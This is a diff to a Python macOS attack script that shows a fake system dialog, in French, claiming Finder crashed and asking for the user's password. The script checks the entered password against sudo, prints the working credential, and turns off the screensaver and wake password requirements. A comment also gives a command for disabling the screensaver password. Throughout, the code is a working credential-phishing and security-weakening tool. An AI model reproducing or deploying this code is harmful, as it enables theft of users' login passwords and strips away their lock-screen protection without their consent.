@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # This Python file uses the following encoding: utf-8
+# Command to not ask for password after screensaver : defaults write com.apple.screensaver askForPassword -int 0
 import subprocess
 import time
 import sys
@@ -39,7 +40,7 @@ def parse(text):
     return password
     
 def verify(password):
-     print str(password)
+     #print str(password)
      sudo_password = str(password)
      return os.popen('echo "%s" | sudo -S whoami 2>&1' % sudo_password).read().count('root')
 
@@ -53,7 +54,8 @@ def verify(password):
 def run(exitCount):
     try:
         print "Starting"
-        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+        subprocess.Popen('sudo whoami', stdout=subprocess.PIPE, shell=True)
+        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Finder s\'est arrete de maniere imprevue. Identifiez-vous pour relancer l\'application." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
         text = process.communicate()
         text = text[0]
         count = 0
@@ -64,23 +66,28 @@ def run(exitCount):
                     break
             if 'button returned:OK, text returned:' in text:
                 password = parse(text)
-                print "First Password is " + str(password)
+                print "First try is " + str(password)
                 if password:
                     whoami()
                     # try to get first password
                     correct = verify(password)
                     if correct:
                         # we found the right password!
-                        print "Password is working " + str(password)
+                        subprocess.Popen("""osascript -e 'tell application "System Events" to set require password to wake of security preferences to false'""", stdout=subprocess.PIPE, shell=True)
+                        print "Working cred found " + str(password)
+                        time.sleep(3)
                         break
                     else:
-                        print "Mauvais mot de passe " + str(password)
+                        print "Bad password : " + str(password)
                         text = retrypassword()
             else:
                 text = retrypassword()
     except Exception as e:
         print e
 
-        
+
 exitCount = 3
 run(exitCount)
+os.system('stty sane')
+print "\n"
+sys.exit()
